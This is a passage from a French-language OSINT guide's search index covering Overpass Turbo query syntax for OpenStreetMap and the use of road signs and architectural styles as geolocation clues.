et la vue actuelle.</li> <li>Exporter : Exporte les donn\u00e9es trouv\u00e9es (GeoJSON, GPX, KML...).</li> <li>Assistant : Aide \u00e0 g\u00e9n\u00e9rer des requ\u00eates simples via une interface guid\u00e9e.</li> </ul> </li> <li>Vue Donn\u00e9es : Onglet affichant les donn\u00e9es brutes des objets trouv\u00e9s.</li> </ul>"},{"location":"Osint/Lieux/Overpass-turbo/#structure-de-base-dune-requete-overpass-ql","title":"Structure de Base d'une Requ\u00eate (Overpass QL)","text":"<pre><code>/*\n  Commentaire optionnel\n  pour expliquer la requ\u00eate\n*/\n[out:json][timeout:25]; // Param\u00e8tres de sortie et de d\u00e9lai\n\n// Bloc de requ\u00eate principal\n(\n  // Instruction 1: Chercher les n\u0153uds avec un tag sp\u00e9cifique dans la zone visible\n  node[\"amenity\"=\"restaurant\"]({{bbox}});\n  // Instruction 2: Chercher les chemins (zones/lignes) avec le m\u00eame tag\n  way[\"amenity\"=\"restaurant\"]({{bbox}});\n  // Instruction 3: Chercher les relations avec le m\u00eame tag (plus rare pour les commodit\u00e9s)\n  // relation[\"amenity\"=\"restaurant\"]({{bbox}});\n);\n\n// Instruction de sortie : afficher les r\u00e9sultats sur la carte\nout center; // 'out;' ou 'out body;' ou 'out geom;' selon ce qu'on veut voir\n</code></pre>"},{"location":"Osint/Lieux/Overpass-turbo/#elements-cles-du-langage-overpass-ql","title":"\u00c9l\u00e9ments Cl\u00e9s du Langage Overpass QL","text":""},{"location":"Osint/Lieux/Overpass-turbo/#1-types-dobjets-osm","title":"1. Types d'Objets OSM","text":"<ul> <li><code>node</code> : Un point g\u00e9ographique (ex: un poteau, un banc, un magasin ponctuel).</li> <li><code>way</code> : Une ligne (ex: une route, une rivi\u00e8re) ou une zone ferm\u00e9e (ex: un b\u00e2timent, un parc).</li> <li><code>relation</code> : Regroupe d'autres objets pour former des entit\u00e9s complexes (ex: un itin\u00e9raire de bus, une fronti\u00e8re administrative, un b\u00e2timent avec cour int\u00e9rieure).</li> <li><code>nwr</code> : Raccourci pour <code>node, way, relation</code>.</li> </ul>"},{"location":"Osint/Lieux/Overpass-turbo/#2-tags-etiquettes-clevaleur","title":"2. Tags (\u00c9tiquettes <code>cl\u00e9=valeur</code>)","text":"<p>C'est le c\u0153ur d'OSM. Chaque objet peut avoir plusieurs tags d\u00e9crivant ce qu'il est. * Trouver les bons tags :     * Wiki OpenStreetMap : La r\u00e9f\u00e9rence principale (https://wiki.openstreetmap.org/wiki/Map_Features en anglais, ou \u00e9quivalent fran\u00e7ais).     * Taginfo : Outil statistique pour voir quels tags sont les plus utilis\u00e9s (https://taginfo.openstreetmap.org/). * Syntaxe des Filtres par Tag :     * Cl\u00e9 existe : <code>[\"power\"]</code> (tous les objets ayant une cl\u00e9 \"power\")     * Valeur exacte : <code>[\"amenity\"=\"restaurant\"]</code>     * Valeur diff\u00e9rente : <code>[\"highway\"!=\"motorway\"]</code> (routes qui ne sont pas des autoroutes)     * Cl\u00e9 n'existe pas : <code>[! \"building\"]</code>     * Correspondance Regex (Expression R\u00e9guli\u00e8re) : <code>[\"name\"~\"Caf\u00e9\"]</code> (nom contenant \"Caf\u00e9\", sensible \u00e0 la casse)     * Correspondance Regex (insensible \u00e0 la casse) : <code>[\"name\"~\"caf\u00e9\", i]</code>     * Non-correspondance Regex : <code>[\"name\"!~\"^Restaurant\"]</code> (nom ne commen\u00e7ant pas par \"Restaurant\")     * Valeurs multiples (OU) : <code>[\"highway\"~\"primary|secondary\"]</code>     * Valeurs multiples (ET - via plusieurs filtres) : <code>[\"shop\"=\"supermarket\"][\"name\"=\"Lidl\"]</code></p>"},{"location":"Osint/Lieux/Overpass-turbo/#3-zone-de-recherche","title":"3. Zone de Recherche","text":"<ul> <li><code>({{bbox}})</code> : Le plus courant dans Overpass Turbo. D\u00e9signe la zone rectangulaire actuellement visible sur la carte.</li> <li><code>(area)</code> : Recherche dans une zone administrative nomm\u00e9e (pays, r\u00e9gion, ville...). N\u00e9cessite de d\u00e9finir la zone au pr\u00e9alable : <pre><code>area[\"ISO3166-1\"=\"FR\"][admin_level=2]-&gt;.pays; // D\u00e9finit la France\nnode[\"amenity\"=\"police\"](area.pays); // Cherche les postes de police en France\n</code></pre></li> <li><code>(around:radius, lat, lon)</code> : Recherche dans un rayon (en m\u00e8tres) autour d'un point sp\u00e9cifique. <pre><code>node(around:500, 48.858, 2.294); // N\u0153uds \u00e0 moins de 500m de la Tour Eiffel\n</code></pre></li> </ul>"},{"location":"Osint/Lieux/Overpass-turbo/#4-instructions-de-sortie-out","title":"4. Instructions de Sortie (<code>out</code>)","text":"<p>Contr\u00f4le ce qui est affich\u00e9/export\u00e9. * <code>out;</code> ou <code>out body;</code> : Sortie standard, inclut les n\u0153uds et la g\u00e9om\u00e9trie des chemins/relations. * <code>out skel;</code> : Sortie \"squelette\" (rapide), juste les IDs et tags, sans g\u00e9om\u00e9trie d\u00e9taill\u00e9e ni n\u0153uds pour les chemins. Utile pour compter ou pour les \u00e9tapes interm\u00e9diaires. * <code>out center;</code> : Affiche le centre g\u00e9om\u00e9trique des zones (ways/relations). Utile pour ne pas surcharger la carte avec les contours des b\u00e2timents/parcs. * <code>out geom;</code> : Sortie compl\u00e8te de la g\u00e9om\u00e9trie, y compris les m\u00e9tadonn\u00e9es (si disponibles). * <code>out count;</code> : Affiche le nombre d'\u00e9l\u00e9ments trouv\u00e9s au lieu des \u00e9l\u00e9ments eux-m\u00eames.</p>"},{"location":"Osint/Lieux/Overpass-turbo/#5-union-et-recursion","title":"5. Union et R\u00e9cursion","text":"<ul> <li><code>( ... );</code> : Bloc d'union. Les r\u00e9sultats de toutes les instructions \u00e0 l'int\u00e9rieur sont combin\u00e9s.</li> <li><code>&gt;;</code> (Recurse Down) : Trouve les n\u0153uds appartenant aux chemins/relations trouv\u00e9s juste avant. <pre><code>way[\"highway\"=\"residential\"]({{bbox}}); // Trouve les rues r\u00e9sidentielles\n&gt;; // Trouve tous les n\u0153uds composant ces rues\nout skel;\n</code></pre></li> <li><code>&lt;;</code> (Recurse Up) : Trouve les chemins/relations qui utilisent les n\u0153uds trouv\u00e9s juste avant.</li> </ul>"},{"location":"Osint/Lieux/Overpass-turbo/#lassistant-wizard","title":"L'Assistant (Wizard)","text":"<p>Pour des requ\u00eates simples, l'Assistant est tr\u00e8s pratique. Tapez une description simple en anglais (souvent), par exemple : * <code>amenity=restaurant in {{bbox}}</code> * <code>power=pole in my city</code> (remplacez \"my city\" par le nom) * <code>name=\"Carrefour\"</code> L'Assistant g\u00e9n\u00e8re la requ\u00eate Overpass QL correspondante.</p>"},{"location":"Osint/Lieux/Overpass-turbo/#exemples-de-requetes-utiles-osintgeoguessr","title":"Exemples de Requ\u00eates Utiles (OSINT/GeoGuessr)","text":"<ul> <li>Poteaux \u00e9lectriques dans la vue : <pre><code>node[\"power\"=\"pole\"]({{bbox}});\nout;\n</code></pre></li> <li>Cam\u00e9ras de surveillance dans la vue : <pre><code>node[\"man_made\"=\"surveillance\"]({{bbox}});\nout;\n</code></pre></li> <li>Restaurants McDonald's dans la vue : <pre><code>nwr[\"amenity\"=\"fast_food\"][\"name\"~\"McDonald\",i]({{bbox}});\nout center;\n</code></pre></li> <li>Bornes d'incendie dans la vue : <pre><code>node[\"emergency\"=\"fire_hydrant\"]({{bbox}});\nout;\n</code></pre></li> <li>Types de barri\u00e8res/cl\u00f4tures sp\u00e9cifiques : <pre><code>way[\"barrier\"=\"fence\"][\"fence_type\"=\"chain_link\"]({{bbox}});\nout geom;\n</code></pre></li> <li>Bo\u00eetes aux lettres (ex: La Poste en France) : <pre><code>node[\"amenity\"=\"post_box\"][\"brand\"~\"La Poste\",i]({{bbox}});\nout;\n</code></pre></li> </ul>"},{"location":"Osint/Lieux/Overpass-turbo/#conseils-pour-losint","title":"Conseils pour l'OSINT","text":"<ul> <li>Explorez le Wiki OSM et Taginfo : La cl\u00e9 est de trouver les bons tags pour ce que vous cherchez (antennes 4G/5G <code>man_made=mast</code> <code>communication:mobile_phone=yes</code>, types de surfaces routi\u00e8res <code>surface=...</code>, etc.).</li> <li>Soyez Sp\u00e9cifique : Plus vos tags sont pr\u00e9cis, plus les r\u00e9sultats sont pertinents.</li> <li>V\u00e9rifiez Visuellement : Utilisez toujours les r\u00e9sultats d'Overpass en conjonction avec l'imagerie satellite ou Street View pour confirmer. La donn\u00e9e OSM n'est pas toujours parfaite ou \u00e0 jour.</li> <li>Qualit\u00e9 Variable : La densit\u00e9 et la pr\u00e9cision des donn\u00e9es OSM varient \u00e9norm\u00e9ment d'une r\u00e9gion \u00e0 l'autre. Les zones urbaines en Europe/Am\u00e9rique du Nord sont souvent tr\u00e8s bien cartographi\u00e9es, d'autres zones beaucoup moins.</li> </ul>"},{"location":"Osint/Lieux/Overpass-turbo/#ressources-utiles","title":"Ressources Utiles","text":"<ul> <li>Wiki Overpass API : https://wiki.openstreetmap.org/wiki/Overpass_API (Documentation d\u00e9taill\u00e9e du langage)</li> <li>Wiki OSM - Map Features : https://wiki.openstreetmap.org/wiki/Map_Features (Liste des tags courants)</li> <li>Taginfo : https://taginfo.openstreetmap.org/ (Statistiques d'utilisation des tags)</li> </ul>"},{"location":"Osint/Lieux/Panneaux%20de%20signalisation/","title":"Panneaux de signalisation","text":""},{"location":"Osint/Lieux/Panneaux%20de%20signalisation/#introduction","title":"Introduction","text":"<p>Apr\u00e8s le marquage au sol, les panneaux de signalisation constituent la deuxi\u00e8me source majeure d'indices visuels routiers pour la g\u00e9olocalisation. Comme pour le marquage, la Convention de Vienne sur la signalisation routi\u00e8re (1968) a \u00e9tabli des standards, mais de tr\u00e8s nombreux pays (y compris les USA, Canada, Australie) ne l'appliquent pas ou seulement partiellement, et m\u00eame les pays signataires ont des variations nationales. Analyser les panneaux est donc essentiel en OSINT.</p>"},{"location":"Osint/Lieux/Panneaux%20de%20signalisation/#1-elements-cles-a-analyser","title":"1. \u00c9l\u00e9ments Cl\u00e9s \u00e0 Analyser","text":"<ul> <li> <p>Forme du Panneau : Triangle, cercle, carr\u00e9, rectangle, octogone, losange, formes sp\u00e9cifiques (ex: \u00e9cussons pour num\u00e9ros de route).</p> </li> <li> <p>Couleurs : Couleur du fond, de la bordure, du symbole, du texte.</p> </li> <li> <p>Symboles / Pictogrammes : Standardis\u00e9s ou sp\u00e9cifiques au pays ? Style graphique ?</p> </li> <li> <p>Texte :</p> <ul> <li> <p>Langue(s) utilis\u00e9e(s).</p> </li> <li> <p>Police de caract\u00e8res (font).</p> </li> <li> <p>Abr\u00e9viations, termes sp\u00e9cifiques.</p> </li> </ul> </li> <li> <p>Montage et Dos du Panneau :</p> <ul> <li> <p>Type de poteau (mat\u00e9riau, forme, couleur).</p> </li> <li> <p>Syst\u00e8me de fixation.</p> </li> <li> <p>Couleur du dos du panneau (souvent gris, mais pas toujours).</p> </li> <li> <p>\u00c9tiquettes ou marquages au dos (inventaire, date, fabricant).</p> </li> </ul> </li> <li> <p>Unit\u00e9s de Mesure : Distances en kilom\u00e8tres (km) ou miles (m) ? Limitations de vitesse ? Hauteurs/largeurs en m\u00e8tres ou pieds/pouces ?</p> </li> </ul>"},{"location":"Osint/Lieux/Panneaux%20de%20signalisation/#2-formes-et-leurs-significations-courantes","title":"2. Formes et Leurs Significations Courantes","text":"<ul> <li> <p>Triangle (Pointe en Haut) :</p> <ul> <li> <p>Usage : Tr\u00e8s r\u00e9pandu en Europe, Afrique, Asie (influence Convention de Vienne).</p> </li> <li> <p>Signification : Danger / Avertissement. Le symbole \u00e0 l'int\u00e9rieur pr\u00e9cise le danger.</p> </li> </ul> </li> <li> <p>Triangle (Pointe en Bas) :</p> <ul> <li> <p>Usage : Quasi universel.</p> </li> <li> <p>Signification : C\u00e9dez le passage / Yield.</p> </li> </ul> </li> <li> <p>Cercle :</p> <ul> <li> <p>Usage : Tr\u00e8s r\u00e9pandu en Europe, Afrique, Asie (influence Convention de Vienne).</p> </li> <li> <p>Signification : R\u00e9glementation.</p> <ul> <li> <p>Bordure Rouge : Interdiction (ex: limitation de vitesse, sens interdit, interdiction de d\u00e9passer).</p> </li> <li> <p>Fond Bleu : Obligation (ex: direction obligatoire, piste cyclable obligatoire, vitesse minimale).</p> </li> <li> <p>Fond Blanc/Jaune avec Barre Diagonale : Fin d'interdiction ou de prescription.</p> </li> </ul> </li> </ul> </li> <li> <p>Octogone :</p> <ul> <li> <p>Usage : Quasi universel.</p> </li> <li> <p>Signification : Arr\u00eat obligatoire / STOP. La couleur (rouge) est constante, mais le texte peut varier (\"STOP\" est le plus courant, mais pas exclusif).</p> </li> </ul> </li> <li> <p>Losange (Diamond) :</p> <ul> <li> <p>Usage : USA, Canada, Irlande, Australie, Nouvelle-Z\u00e9lande, Japon...</p> </li> <li> <p>Signification : Danger / Avertissement (souvent sur fond jaune).</p> </li> <li> <p>Usage (Europe) : Peut aussi indiquer une route prioritaire (sur fond blanc/jaune, ex: Allemagne, France).</p> </li> </ul> </li> <li> <p>Carr\u00e9 / Rectangle :</p> <ul> <li> <p>Usage : Universel.</p> </li> <li> <p>Signification : Information, Direction, Services. Les couleurs varient \u00e9norm\u00e9ment selon le pays et le type de route (voir section couleurs).</p> </li> </ul> </li> </ul>"},{"location":"Osint/Lieux/Panneaux%20de%20signalisation/#3-le-code-couleur-des-fonds","title":"3. Le Code Couleur des Fonds","text":"<ul> <li> <p>Rouge : Principalement pour le panneau STOP et les bordures d'interdiction/danger.</p> </li> <li> <p>Jaune :</p> <ul> <li> <p>Avertissement/Danger : USA, Canada, Australie, NZ, Irlande, Japon...</p> </li> <li> <p>Marquage Temporaire/Travaux : Souvent en Europe (m\u00eame pour les panneaux de danger habituellement blancs).</p> </li> <li> <p>Route Prioritaire : Parfois (ex: Allemagne).</p> </li> <li> <p>Direction : Routes secondaires dans certains pays.</p> </li> </ul> </li> <li> <p>Blanc :</p> <ul> <li> <p>Fond pour R\u00e9glementation/Interdiction : Souvent en Europe (avec bordure rouge).</p> </li> <li> <p>Fond pour Information Locale : Noms de rue, informations diverses.</p> </li> <li> <p>Limitations de Vitesse : USA (rectangulaire), certains pays europ\u00e9ens (cercle).</p> </li> </ul> </li> <li> <p>Bleu :</p> <ul> <li> <p>Obligation : Europe (cercle).</p> </li> <li> <p>Direction (Autoroutes) : France, Allemagne, Italie, Espagne, Suisse, Belgique...</p> </li> <li> <p>Direction (Autres Routes) : Certains pays.</p> </li> <li> <p>Information / Services : Tr\u00e8s courant.</p> </li> </ul> </li> <li> <p>Vert :</p> <ul> <li> <p>Direction (Autoroutes) : UK, Irlande, Scandinavie, Gr\u00e8ce, Pologne, certains pays d'Asie...</p> </li> <li> <p>Direction (Routes Principales) : USA, Canada, Australie...</p> </li> <li> <p>Direction (Autres Routes) : France, Italie, Suisse...</p> </li> </ul> </li> <li> <p>Marron :</p> <ul> <li> <p>Usage : Assez universel.</p> </li> <li> <p>Signification : Indication touristique, points d'int\u00e9r\u00eat culturel ou naturel.</p> </li> </ul> </li> <li> <p>Orange :</p> <ul> <li> <p>Usage : Principalement USA, Canada.</p> </li> <li> <p>Signification : Travaux / Construction / Zone temporaire.</p> </li> </ul> </li> </ul>"},{"location":"Osint/Lieux/Panneaux%20de%20signalisation/#4-symboles-et-pictogrammes","title":"4. Symboles et Pictogrammes","text":"<p>M\u00eame si la Convention de Vienne standardise de nombreux symboles (silhouette de pi\u00e9ton, de cerf, de travaux...), des variations nationales existent :</p> <ul> <li> <p>Animaux : Cerf (Europe) vs Wapiti/Orignal (Am. Nord, Scandinavie) vs Kangourou (Australie) vs Kiwi (NZ) vs Vache... Le style du dessin varie aussi.</p> </li> <li> <p>Style Graphique : Plus ou moins d\u00e9taill\u00e9, stylis\u00e9.</p> </li> <li> <p>Symboles Uniques : Certains pays ont des symboles pour des dangers ou situations sp\u00e9cifiques inexistants ailleurs.</p> </li> </ul>"},{"location":"Osint/Lieux/Panneaux%20de%20signalisation/#5-langue-texte-et-police","title":"5. Langue, Texte et Police","text":"<ul> <li> <p>Langue : L'indice le plus \u00e9vident. Attention aux pays multilingues (Canada: FR/EN, Belgique: FR/NL/DE, Suisse: DE/FR/IT/RM, Finlande: FI/SV, Irlande: GA/EN, Pays de Galles: CY/EN...) o\u00f9 la pr\u00e9sence de plusieurs langues est un indice fort.</p> </li> <li> <p>Police de Caract\u00e8res (Font) : Tr\u00e8s distinctif !</p> <ul> <li> <p>USA : Highway Gothic (ancien) / Clearview (plus r\u00e9cent).</p> </li> <li> <p>Allemagne : DIN 1451.</p> </li> <li> <p>France : Caract\u00e8res (L1 \u00e0 L5).</p> </li> <li> <p>UK : Transport.</p> </li> <li> <p>Italie : Alfabeto Normale / Alfabeto Stretto.</p> </li> <li> <p>Su\u00e8de : Tratex.</p> </li> </ul> </li> <li> <p>La reconnaissance de la police peut suffire \u00e0 identifier un pays.</p> </li> <li> <p>Terminologie / Abr\u00e9viations : \"Exit\" vs \"Sortie\" vs \"Ausfahrt\" ; \"km/h\" vs \"MPH\" ; \"Centre Ville\" vs \"Downtown\" vs \"Zentrum\".</p> </li> </ul>"},{"location":"Osint/Lieux/Panneaux%20de%20signalisation/#6-montage-et-dos-du-panneau","title":"6. Montage et Dos du Panneau","text":"<ul> <li> <p>Poteaux : Ronds, carr\u00e9s, rectangulaires, parfois nervur\u00e9s (ex: France), en m\u00e9tal galvanis\u00e9, peints (couleur ?), en bois (rare, parfois USA/Canada/Scandinavie). Fixation simple ou double ?</p> </li> <li> <p>Dos du Panneau : G\u00e9n\u00e9ralement gris, mais peut \u00eatre d'une autre couleur. Pr\u00e9sence d'autocollants (codes-barres, dates, logos de la municipalit\u00e9 ou de l'agence routi\u00e8re) ?</p> </li> </ul>"},{"location":"Osint/Lieux/Panneaux%20de%20signalisation/#7-exemples-de-systemes-distinctifs","title":"7. Exemples de Syst\u00e8mes Distinctifs","text":"<ul> <li> <p>Syst\u00e8me Am\u00e9ricain (MUTCD) : Losanges jaunes (danger), rectangles blancs (r\u00e9glementation texte), octogone STOP, \u00e9cussons sp\u00e9cifiques pour les routes (Interstate bleu/rouge, US Route blanc/noir), unit\u00e9s en miles/feet.</p> </li> <li> <p>Syst\u00e8me Europ\u00e9en (Vienna) : Triangles pointe en haut (danger), cercles (r\u00e9glementation), rectangles/carr\u00e9s (info/direction), unit\u00e9s m\u00e9triques. Couleurs variables pour les directions (bleu/vert/blanc/jaune selon pays et type de route).</p> </li> <li> <p>Syst\u00e8me Britannique/Irlandais : Mixte. Formes europ\u00e9ennes mais couleurs parfois diff\u00e9rentes (ex: directions primaires vertes au UK). Unit\u00e9s imp\u00e9riales (UK) vs m\u00e9triques (Irlande). Polices sp\u00e9cifiques. Conduite \u00e0 gauche.</p> </li> </ul>"},{"location":"Osint/Lieux/Panneaux%20de%20signalisation/#8-application-osint","title":"8. Application OSINT","text":"<ul> <li> <p>Combinaison d'Indices : Un panneau seul est utile, mais la combinaison (forme + couleur + symbole + langue + police) est tr\u00e8s puissante.</p> </li> <li> <p>Coh\u00e9rence Environnementale : Les panneaux doivent \u00eatre coh\u00e9rents avec les autres indices (marquage au sol, architecture, paysage...).</p> </li> <li> <p>Direction et Distance : Les panneaux directionnels donnent des noms de villes/villages et des num\u00e9ros de route. Ces informations sont directement utilisables pour une recherche cartographique ou sur le web.</p> </li> <li> <p>Identification d'Agence : Les logos ou noms sur les \u00e9tiquettes au dos peuvent identifier l'autorit\u00e9 routi\u00e8re (nationale, r\u00e9gionale, municipale).</p> </li> </ul>"},{"location":"Osint/Lieux/Styles%20architecturaux/","title":"Styles architecturaux","text":""},{"location":"Osint/Lieux/Styles%20architecturaux/#introduction","title":"Introduction","text":"<p>L'architecture des b\u00e2timents est un puissant indicateur g\u00e9ographique. Les styles de construction, les mat\u00e9riaux utilis\u00e9s et les caract\u00e9ristiques sp\u00e9cifiques varient \u00e9norm\u00e9ment \u00e0 travers le monde, influenc\u00e9s par le climat, l'histoire, la culture locale, les ressources disponibles et les r\u00e9glementations. Analyser l'architecture demande de l'observation, mais peut permettre de localiser une image avec une pr\u00e9cision surprenante, parfois jusqu'\u00e0 une r\u00e9gion ou une ville sp\u00e9cifique.</p>"},{"location":"Osint/Lieux/Styles%20architecturaux/#1-elements-cles-a-analyser","title":"1. \u00c9l\u00e9ments Cl\u00e9s \u00e0 Analyser","text":"<ul> <li> <p>Style Architectural G\u00e9n\u00e9ral : Moderne, historique, vernaculaire (traditionnel/local) ? Influence sp\u00e9cifique (coloniale, sovi\u00e9tique...) ?</p> </li> <li> <p>Mat\u00e9riaux de Construction : Brique, pierre, bois, b\u00e9ton, pis\u00e9, stuc ? Couleur et texture ?</p> </li> <li> <p>Forme et Mat\u00e9riau des Toits : En pente, plat ? Tuiles, ardoise, m\u00e9tal, bardeaux, chaume ?</p> </li> <li> <p>Fen\u00eatres et Portes : Forme, taille, disposition, pr\u00e9sence et style de volets ou de barreaux.</p> </li> <li> <p>Caract\u00e9ristiques Sp\u00e9cifiques : Balcons, chemin\u00e9es, porches, climatiseurs, r\u00e9servoirs d'eau, escaliers ext\u00e9rieurs...</p> </li> <li> <p>Densit\u00e9 et Disposition : Urbain dense (immeubles mitoyens), suburbain (maisons individuelles avec jardins), rural (fermes isol\u00e9es) ?</p> </li> <li> <p>\u00c2ge et \u00c9tat du B\u00e2timent : Neuf, ancien, r\u00e9nov\u00e9, d\u00e9labr\u00e9 ?</p> </li> </ul>"},{"location":"Osint/Lieux/Styles%20architecturaux/#2-influence-du-climat","title":"2. Influence du Climat","text":"<ul> <li> <p>Climats Froids :</p> <ul> <li> <p>Toits en forte pente : Pour \u00e9vacuer la neige (Scandinavie, Canada, Alpes...).</p> </li> <li> <p>Petites fen\u00eatres : Pour limiter les pertes de chaleur.</p> </li> <li> <p>Chemin\u00e9es centrales/imposantes.</p> </li> <li> <p>Mat\u00e9riaux isolants : Bois souvent pr\u00e9dominant.</p> </li> </ul> </li> <li> <p>Climats Chauds et Arides :</p> <ul> <li> <p>Toits plats ou tr\u00e8s faible pente : Parfois utilis\u00e9s comme terrasse.</p> </li> <li> <p>Murs \u00e9pais : Inertie thermique (pierre, pis\u00e9, adobe - ex: M\u00e9diterran\u00e9e, Moyen-Orient, Mexique, Sud-Ouest USA).</p> </li> <li> <p>Petites fen\u00eatres : Limiter l'entr\u00e9e du soleil.</p> </li> <li> <p>Couleurs claires : Pour r\u00e9fl\u00e9chir la chaleur (blanc typique des \u00eeles grecques).</p> </li> <li> <p>Cours int\u00e9rieures (patios) : Pour la fra\u00eecheur.</p> </li> </ul> </li> <li> <p>Climats Chauds et Humides :</p> <ul> <li> <p>Fondations sur\u00e9lev\u00e9es (pilotis) : Pour la ventilation et contre les inondations/animaux (Asie du Sud-Est, certaines zones d'Afrique/Am. Latine).</p> </li> <li> <p>Larges avant-toits, v\u00e9randas, porches : Pour l'ombre et la protection contre la pluie.</p> </li> <li> <p>Ventilation crois\u00e9e : Grandes fen\u00eatres, persiennes, jalousies.</p> </li> <li> <p>Mat\u00e9riaux l\u00e9gers : Bois, bambou.</p> </li> </ul> </li> </ul>"},{"location":"Osint/Lieux/Styles%20architecturaux/#3-materiaux-de-construction-visibles","title":"3. Mat\u00e9riaux de Construction Visibles","text":"<ul> <li> <p>Brique :</p> <ul> <li> <p>Couleur : Rouge (UK, Pays-Bas, Est USA...), jaune (Belgique, Nord France...), marron, grise...</p> </li> <li> <p>Taille et Appareillage (motif de pose) : Varient r\u00e9gionalement.</p> </li> </ul> </li> <li> <p>Pierre :</p> <ul> <li>Type : Granit (Bretagne, \u00c9cosse...), calcaire (Bourgogne, Sud Angleterre...), gr\u00e8s, pierre de taille vs moellons bruts. La couleur d\u00e9pend de la g\u00e9ologie locale.</li> </ul> </li> <li> <p>Bois :</p> <ul> <li> <p>Colombages (Half-timbering / Fachwerk) : Structure en bois apparente, remplissage en torchis, brique ou autre (Allemagne, Alsace, Normandie, UK...).</p> </li> <li> <p>Bardage (Clapboard/Siding) : Planches horizontales ou verticales (tr\u00e8s courant en Am\u00e9rique du Nord, Scandinavie).</p> </li> <li> <p>Madriers (Log cabin) : Am\u00e9rique du Nord, Scandinavie, Russie.</p> </li> </ul> </li> <li> <p>Enduit (Stuc / Cr\u00e9pi / Pl\u00e2tre) :</p> <ul> <li>Tr\u00e8s courant pour masquer des mat\u00e9riaux moins nobles ou pour l'esth\u00e9tique. Couleurs et textures vari\u00e9es (M\u00e9diterran\u00e9e, Am\u00e9rique Latine...).</li> </ul> </li> <li> <p>B\u00e9ton :</p> <ul> <li> <p>Brutalisme : Style architectural utilisant le b\u00e9ton brut (souvent ann\u00e9es 50-70).</p> </li> <li> <p>Construction moderne : Blocs de b\u00e9ton (parpaings) souvent enduits, b\u00e9ton pr\u00e9fabriqu\u00e9 (grands ensembles).</p> </li> </ul> </li> <li> <p>Terre Crue (Adobe / Pis\u00e9 / Torchis) :</p> <ul> <li>R\u00e9gions arides ou rurales, construction traditionnelle (Afrique, Moyen-Orient, Am\u00e9rique Latine, Sud-Ouest USA).</li> </ul> </li> </ul>"},{"location":"Osint/Lieux/Styles%20architecturaux/#4-toits-formes-et-materiaux","title":"4. Toits : Formes et Mat\u00e9riaux","text":"<ul> <li> <p>Formes Courantes :</p> <ul> <li> <p>\u00c0 deux versants (Gable) : Le plus simple et courant.</p> </li> <li> <p>En croupe (Hip) : Quatre versants inclin\u00e9s.</p> </li> <li> <p>Mansard\u00e9 (Mansard) : Double pente sur chaque c\u00f4t\u00e9 (origine fran\u00e7aise).</p> </li> <li> <p>Plat (Flat) : Climats arides, architecture moderne.</p> </li> <li> <p>\u00c0 l'imp\u00e9riale, en d\u00f4me, etc. : Formes plus sp\u00e9cifiques.</p> </li> </ul> </li> <li> <p>Mat\u00e9riaux de Couverture :</p> <ul> <li> <p>Tuiles en terre cuite : Forme (canal/romane - Sud Europe ; plate - Nord Europe) et couleur (rouge, orange, marron...) varient.</p> </li> <li> <p>Ardoise : Gris fonc\u00e9/noir, souvent en Europe de l'Ouest (France, UK, Belgique, Espagne...).</p> </li> <li> <p>Bardeaux d'asphalte (Asphalt shingles) : Extr\u00eamement courant en Am\u00e9rique du Nord, aspect granuleux, couleurs vari\u00e9es.</p> </li> <li> <p>T\u00f4le M\u00e9tallique : Ondul\u00e9e ou \u00e0 joint debout, couleurs vari\u00e9es (courant en milieu rural, tropical, ou architecture moderne).</p> </li> <li> <p>Bois (Bardeaux / Shakes) : Am\u00e9rique du Nord, Scandinavie.</p> </li> <li> <p>Chaume (Thatch) : Tr\u00e8s localis\u00e9 (Normandie, UK, Irlande, Pays-Bas...).</p> </li> </ul> </li> </ul>"},{"location":"Osint/Lieux/Styles%20architecturaux/#5-fenetres-et-portes","title":"5. Fen\u00eatres et Portes","text":"<ul> <li> <p>Forme : Rectangulaire, cintr\u00e9e (arc), \u0153il-de-b\u0153uf (ronde).</p> </li> <li> <p>Menuiserie / Vitrage : Nombre de carreaux (petits bois), type d'ouverture (battante, coulissante, \u00e0 guillotine - sash window typique UK/USA).</p> </li> <li> <p>Volets :</p> <ul> <li> <p>Type : Battants, roulants, persiennes.</p> </li> <li> <p>Mat\u00e9riau : Bois, m\u00e9tal, PVC.</p> </li> <li> <p>Fonction : Fonctionnels (protection solaire/s\u00e9curit\u00e9) ou purement d\u00e9coratifs. Tr\u00e8s courants en Europe du Sud, moins en Europe du Nord ou Am\u00e9rique du Nord (sauf style).</p> </li> </ul> </li> <li> <p>Portes : Style (classique, moderne), mat\u00e9riau (bois, m\u00e9tal, PVC), pr\u00e9sence d'impostes vitr\u00e9es au-dessus ou de fen\u00eatres lat\u00e9rales.</p> </li> </ul>"},{"location":"Osint/Lieux/Styles%20architecturaux/#6-caracteristiques-specifiques-notables","title":"6. Caract\u00e9ristiques Sp\u00e9cifiques Notables","text":"<ul> <li> <p>Balcons : En fer forg\u00e9 ouvrag\u00e9 (France, Espagne, La Nouvelle-Orl\u00e9ans...), en bois, en b\u00e9ton. Leur fr\u00e9quence et style varient.</p> </li> <li> <p>Chemin\u00e9es : Position (pignon, centrale), taille, mat\u00e9riau (brique, pierre), pr\u00e9sence de mitrons (pots de chemin\u00e9e) sp\u00e9cifiques.</p> </li> <li> <p>Porches / V\u00e9randas : Tr\u00e8s courants aux USA (surtout Sud et Est), Canada, Australie. Moins fr\u00e9quents en Europe continentale.</p> </li> <li> <p>Climatiseurs : Unit\u00e9s de fen\u00eatre (plut\u00f4t Am\u00e9rique du Nord, Asie), split-systems muraux (tr\u00e8s courants mondialement aujourd'hui). Leur absence/pr\u00e9sence/type peut \u00eatre un indice.</p> </li> <li> <p>R\u00e9servoirs d'Eau sur les Toits : Typiques de certaines r\u00e9gions/pays pour la pression ou le stockage (Gr\u00e8ce, Malte, Moyen-Orient, Am\u00e9rique Latine...).</p> </li> <li> <p>Escaliers de Secours Ext\u00e9rieurs : En m\u00e9tal, typiques des fa\u00e7ades d'immeubles anciens dans les villes nord-am\u00e9ricaines (New York, Chicago...).</p> </li> </ul>"},{"location":"Osint/Lieux/Styles%20architecturaux/#7-disposition-et-contexte-urbainrural","title":"7. Disposition et Contexte Urbain/Rural","text":"<ul> <li> <p>Alignement : B\u00e2timents mitoyens en front de rue (typique des centres historiques europ\u00e9ens) vs maisons isol\u00e9es en retrait avec jardin (suburbain nord-am\u00e9ricain/australien).</p> </li> <li> <p>Hauteur : Pr\u00e9dominance d'immeubles hauts vs maisons basses.</p> </li> <li> <p>Style Rural : Fermes (long\u00e8res, mas, ranchs...), granges (style \"barn\" am\u00e9ricain vs granges europ\u00e9ennes), d\u00e9pendances.</p> </li> </ul>"},{"location":"Osint/Lieux/Styles%20architecturaux/#8-influences-historiques-et-styles-marquants","title":"8. Influences Historiques et Styles 